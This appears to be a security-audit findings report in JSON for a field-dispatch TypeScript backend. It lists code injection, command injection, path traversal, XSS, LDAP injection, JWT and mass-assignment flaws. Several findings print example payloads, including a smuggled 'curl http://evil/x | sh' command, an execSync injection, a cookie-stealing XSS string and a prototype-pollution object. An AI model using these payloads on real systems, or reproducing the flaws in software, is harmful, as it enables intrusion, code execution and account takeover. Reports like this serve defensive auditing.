@@ -1,0 +1,484 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.audit.code-injection-new-function",
+      "path": "backend/src/routes/jobs.ts",
+      "start": {
+        "line": 189,
+        "col": 1,
+        "offset": 6399
+      },
+      "end": {
+        "line": 190,
+        "col": 52,
+        "offset": 6537
+      },
+      "extra": {
+        "message": "The `formula` query parameter is interpolated directly into the body of a `new Function(...)` and executed server-side in calculateCustomSurchargeQuote(). An authenticated dispatcher/ops_admin (or anyone reaching GET /api/jobs/:id/custom-surcharge-quote) can inject arbitrary JavaScript that runs with the Node process privileges, e.g. formula=`process.mainModule.require('child_process').execSync('id')`. This is arbitrary code execution / remote code execution.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Code Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.insecure-v8-deserialization",
+      "path": "backend/src/routes/jobs.ts",
+      "start": {
+        "line": 52,
+        "col": 1,
+        "offset": 1920
+      },
+      "end": {
+        "line": 52,
+        "col": 28,
+        "offset": 1947
+      },
+      "extra": {
+        "message": "loadRouteCheckpointLog() calls node:v8 `deserialize()` on a binary blob supplied by clients (POST /:id/checkpoint-sync stores attacker-controlled base64 as a Buffer via storeCheckpointSyncBlob, then GET /:id/checkpoint-sync deserializes it). Deserializing untrusted v8-serialized data is unsafe and can be abused for remote code execution (memory-corruption gadgets). The deserialized data is reconstructed as an attacker-chosen object graph.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-502: Deserialization of Untrusted Data"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.os-command-injection-execsync",
+      "path": "backend/src/routes/exports.ts",
+      "start": {
+        "line": 40,
+        "col": 1,
+        "offset": 1396
+      },
+      "end": {
+        "line": 40,
+        "col": 53,
+        "offset": 1448
+      },
+      "extra": {
+        "message": "convertRouteSheetDocument() passes the unvalidated `format` query parameter (via outputPath on line 38) into an execSync() shell command: `pandoc ${sourcePath} -o ${outputPath}`. A value such as `pdf; curl http://evil/x | sh` breaks out of the filename and executes arbitrary OS commands as the server user. Unlike convertIncidentReportDocument(), this function has no format allowlist. Reachable by authenticated dispatcher/ops_admin via GET /api/exports/routes/:id/document.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.path-traversal-file-write-route-manifest",
+      "path": "backend/src/routes/routes.ts",
+      "start": {
+        "line": 49,
+        "col": 1,
+        "offset": 1679
+      },
+      "end": {
+        "line": 50,
+        "col": 47,
+        "offset": 1799
+      },
+      "extra": {
+        "message": "archiveRouteManifestBundle() writes `${bundleLabel}.manifest.txt` under the exports dir without sanitizing bundleLabel. A bundleLabel like `../../../../tmp/evil` makes path.join() escape the intended directory and fs.writeFileSync() writes attacker-controlled `content` to an arbitrary filesystem path. The endpoint is reachable by any authenticated field_worker (route ownership check only requires the worker be assigned to one job on the route). Arbitrary file write can lead to code execution or data tampering.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.path-traversal-file-read-letterhead",
+      "path": "backend/src/routes/exports.ts",
+      "start": {
+        "line": 57,
+        "col": 1,
+        "offset": 2060
+      },
+      "end": {
+        "line": 64,
+        "col": 48,
+        "offset": 2357
+      },
+      "extra": {
+        "message": "loadRegionLetterheadFragment() builds `path.join(LETTERHEAD_DIR, ${letterhead}.html)` from the unvalidated `letterhead` query parameter and reads it back. Values containing `../` (e.g. `../../config`) traverse out of the letterhead directory to read arbitrary `.html` files (path traversal / arbitrary file disclosure). Note the sibling endpoint loadInvoiceLetterheadFragment() restricts to an ALLOWED_LETTERHEADS allowlist and resolves/checks the path, showing this one is missing the same protection.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.path-traversal-file-write-proof-upload",
+      "path": "backend/src/routes/proofs.ts",
+      "start": {
+        "line": 246,
+        "col": 1,
+        "offset": 8859
+      },
+      "end": {
+        "line": 249,
+        "col": 60,
+        "offset": 9031
+      },
+      "extra": {
+        "message": "Proof upload builds the on-disk name as `${Date.now()}-${data.filename}` and writes it with createWriteStream(path.join(uploadDir, uniqueName)) without sanitizing data.filename. A multipart filename containing `../` escapes the proofs directory and writes attacker-controlled content to an arbitrary path (arbitrary file write). The stored filePath is later used by DELETE /proofs/:id with fs.unlinkSync(path.resolve(uploadDir, existing.filePath)) (line 360), so a crafted filename can also cause deletion of arbitrary files.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.idor-proof-download",
+      "path": "backend/src/routes/proofs.ts",
+      "start": {
+        "line": 188,
+        "col": 1,
+        "offset": 6989
+      },
+      "end": {
+        "line": 202,
+        "col": 43,
+        "offset": 7418
+      },
+      "extra": {
+        "message": "GET /api/proofs/:id/download applies a visibility/ownership check only when the caller has role 'customer'. Any authenticated field_worker (and any dispatcher, regardless of region) can download proofs belonging to any job, including internal_only proofs (signed documents, chain-of-custody, internal photos) by enumerating proof IDs \u2014 no check that a worker is assigned to the job or that a dispatcher owns the region. Broken access control / IDOR exposing sensitive proof files.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.stored-xss-status-widget",
+      "path": "backend/src/routes/customers.ts",
+      "start": {
+        "line": 184,
+        "col": 1,
+        "offset": 6152
+      },
+      "end": {
+        "line": 186,
+        "col": 31,
+        "offset": 6313
+      },
+      "extra": {
+        "message": "renderEmbeddableJobStatusWidget() serves text/html and interpolates the DB-stored customer.name (and job.jobNumber/status) directly into the HTML with no escaping. A customer name such as `<img src=x onerror=alert(document.cookie)>` results in stored XSS executing in the origin of the API when the widget URL is opened, since customer.name is reflected unsanitized into an HTML document.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Cross-site Scripting"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.ldap-injection-staff-search",
+      "path": "backend/src/services/staffDirectory.ts",
+      "start": {
+        "line": 19,
+        "col": 1,
+        "offset": 853
+      },
+      "end": {
+        "line": 19,
+        "col": 43,
+        "offset": 895
+      },
+      "extra": {
+        "message": "searchStaff() builds an LDAP filter by concatenating the raw search term: `(cn=*${searchTerm}*)` with no escaping, and the filter is forwarded verbatim to the corporate LDAP directory by directoryGateway (see directoryGateway.ts comment). A search term such as `x)(|(objectClass=*))(&(cn=` alters the filter and lets an authenticated dispatcher/ops_admin (via GET /api/customers/staff-directory) inject arbitrary LDAP filter logic to enumerate directory records. Note findUserByEmail() applies escapeLdapFilter() but searchStaff() does not, confirming the missing control.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: LDAP Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.unverified-jwt-authentication",
+      "path": "backend/src/routes/carrierSync.ts",
+      "start": {
+        "line": 25,
+        "col": 1,
+        "offset": 1038
+      },
+      "end": {
+        "line": 25,
+        "col": 40,
+        "offset": 1077
+      },
+      "extra": {
+        "message": "handleResourceCheck() authenticates the partner carrier using decodeCarrierToken(token) \u2014 a fast-jwt decoder that only base64-decodes the JWT and never verifies its signature. Anyone can forge an arbitrary x-access-token header (e.g. with any userId/carrierId claims) and call POST /api/cost-allocation/resource-check without credentials. This is broken/absent authentication (contrast with processAllocationExport(), which correctly uses verifyPartnerLedgerToken()).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-345: Insufficient Verification of Data Authenticity",
+            "CWE-287: Improper Authentication"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.mass-assignment-privilege-escalation",
+      "path": "backend/src/routes/workers.ts",
+      "start": {
+        "line": 153,
+        "col": 1,
+        "offset": 4900
+      },
+      "end": {
+        "line": 157,
+        "col": 29,
+        "offset": 4994
+      },
+      "extra": {
+        "message": "applyDispatchBoardPreferences() JSON-parses the user-controlled `board_layout` cookie and spreads every key straight into db.update(users).set({...restored}). A field worker can set their own `role` to 'ops_admin', or modify isActive/regionId/passwordHash etc., because no allowlist restricts updatable columns. After re-login the JWT is issued with the tampered DB role, giving a low-privilege user full admin privileges (mass assignment / privilege escalation).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes",
+            "CWE-269: Improper Privilege Management"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.mass-assignment-user-update",
+      "path": "backend/src/routes/workers.ts",
+      "start": {
+        "line": 110,
+        "col": 1,
+        "offset": 3682
+      },
+      "end": {
+        "line": 113,
+        "col": 29,
+        "offset": 3767
+      },
+      "extra": {
+        "message": "applyCertificationRenewalForm() spreads arbitrary multipart form fields (`...formFields`) from an unauthenticated structure into db.update(users).set() for any target user id. A dispatcher can include fields such as `role=ops_admin` or a known `passwordHash` (bcrypt of a chosen password) and thereby take over an ops_admin (or any) account \u2014 the worker lookup only checks that the target user exists. Mass assignment enabling cross-privilege account takeover.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes",
+            "CWE-269: Improper Privilege Management"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.prototype-pollution-deep-merge",
+      "path": "backend/src/routes/workers.ts",
+      "start": {
+        "line": 19,
+        "col": 1,
+        "offset": 596
+      },
+      "end": {
+        "line": 31,
+        "col": 1,
+        "offset": 686
+      },
+      "extra": {
+        "message": "mergeCapabilitiesInto() recursively copies JSON-parsed keys into plain objects without guarding against `__proto__`/`constructor`/`prototype` keys. In registerFieldDeviceCapabilities(), the attacker-controlled `x-device-capabilities` header (any authenticated worker, for their own id) is merged onto a fresh object; a payload like {\"__proto__\":{\"isAdmin\":true}} writes properties onto Object.prototype of the Node process (prototype pollution), which can break authorization logic or be leveraged for further exploitation across the whole server.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1321: Improperly Controlled Modification of Object Prototype Attributes (Prototype Pollution)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.internal-data-disclosure-job-dossier",
+      "path": "backend/src/routes/jobs.ts",
+      "start": {
+        "line": 127,
+        "col": 1,
+        "offset": 4497
+      },
+      "end": {
+        "line": 135,
+        "col": 38,
+        "offset": 4718
+      },
+      "extra": {
+        "message": "getJobDetail() returns the complete job 'dossier' to an owning customer, including all incidents (with their internalNotes) and all messages \u2014 even isInternal messages whose content is redacted for customers by the dedicated thread endpoint getJobMessageThread(). This bypasses the internal-note/message redaction control and discloses internal dispatcher-only notes to customer users.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-863: Incorrect Authorization",
+            "CWE-200: Exposure of Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.stack-trace-disclosure",
+      "path": "backend/src/routes/jobs.ts",
+      "start": {
+        "line": 157,
+        "col": 1,
+        "offset": 5223
+      },
+      "end": {
+        "line": 158,
+        "col": 79,
+        "offset": 5333
+      },
+      "extra": {
+        "message": "In getJobDetail()'s catch handler, passing `?verbosity=full` returns the raw error message AND the full server stack trace to the client. Any authenticated user can trigger an error (e.g. malformed job id) and read internal stack details, file paths, and query internals \u2014 information disclosure aiding further attacks.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.hardcoded-jwt-secret",
+      "path": "backend/src/config.ts",
+      "start": {
+        "line": 6,
+        "col": 1,
+        "offset": 222
+      },
+      "end": {
+        "line": 6,
+        "col": 78,
+        "offset": 299
+      },
+      "extra": {
+        "message": "The JWT signing secret falls back to the hardcoded, well-known value 'dev-jwt-secret-change-in-production' when JWT_SECRET is unset. If deployed without the env var, an attacker can forge valid session cookies/JWTs for any user (including ops_admin) and fully bypass authentication.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.hardcoded-crypto-key",
+      "path": "backend/src/routes/proofs.ts",
+      "start": {
+        "line": 20,
+        "col": 1,
+        "offset": 629
+      },
+      "end": {
+        "line": 20,
+        "col": 148,
+        "offset": 776
+      },
+      "extra": {
+        "message": "SIGNATURE_CAPTURE_KEY is derived from process.env.SIGNATURE_CAPTURE_SECRET with the hardcoded fallback 'field-dispatch-capture-secret'. When the env var is not configured, the AES-256-CBC key used to protect customer e-signature captures is publicly known, so anyone can decrypt/forge offline signature payloads.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.hardcoded-crypto-key",
+      "path": "backend/src/routes/incidents.ts",
+      "start": {
+        "line": 22,
+        "col": 1,
+        "offset": 673
+      },
+      "end": {
+        "line": 22,
+        "col": 141,
+        "offset": 813
+      },
+      "extra": {
+        "message": "EVIDENCE_SEAL_KEY is derived from process.env.EVIDENCE_SEAL_SECRET with the hardcoded fallback 'field-dispatch-evidence-secret'. When the env var is unset, the AES-256-GCM key used to authenticate/seal incident evidence is public, letting an attacker forge or decrypt evidence blobs.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.sensitive-token-logging",
+      "path": "backend/src/routes/auth.ts",
+      "start": {
+        "line": 231,
+        "col": 1,
+        "offset": 7272
+      },
+      "end": {
+        "line": 231,
+        "col": 74,
+        "offset": 7345
+      },
+      "extra": {
+        "message": "The password-reset flow writes the one-time reset token (crypto.randomUUID) to the server console (`console.log`) for every password reset request. These tokens are equivalent to a password-reset credential and end up in logs, where they may be exposed to log aggregators or other staff, enabling account takeover.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
